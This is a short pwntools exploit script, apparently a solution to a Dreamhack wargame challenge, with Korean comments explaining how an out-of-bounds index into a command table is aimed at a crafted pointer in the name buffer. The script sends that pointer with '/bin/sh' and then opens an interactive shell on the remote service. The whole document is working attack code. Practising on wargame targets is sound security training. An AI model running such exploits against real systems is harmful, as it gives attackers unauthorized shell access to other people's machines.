from pwn import *

p = remote("host1.dreamhack.games", 18590)
#command[19]에 들어가 있는 값이 name[0] 주소와 같다.
# (name과 command 주소 차이가 76이고 eax 값이 19가 되므로. eax는 id일 것이다. 즉 payload_2
# payload_2가 19라면 20번째 원소이므로 name+4를 해줌.
# 반대로 payload_2가18이라면 19번째 원소이므로 name을 해주면 된다.



name= 0x804a0ac
command= 0x804a060


payload_1= p32(name+4)
payload_1+= "/bin/sh"

payload_2="19"

p.recvuntil("name: ")
p.sendline(payload_1)


p.recvuntil("want?: ")
p.sendline(payload_2)


p.interactive()
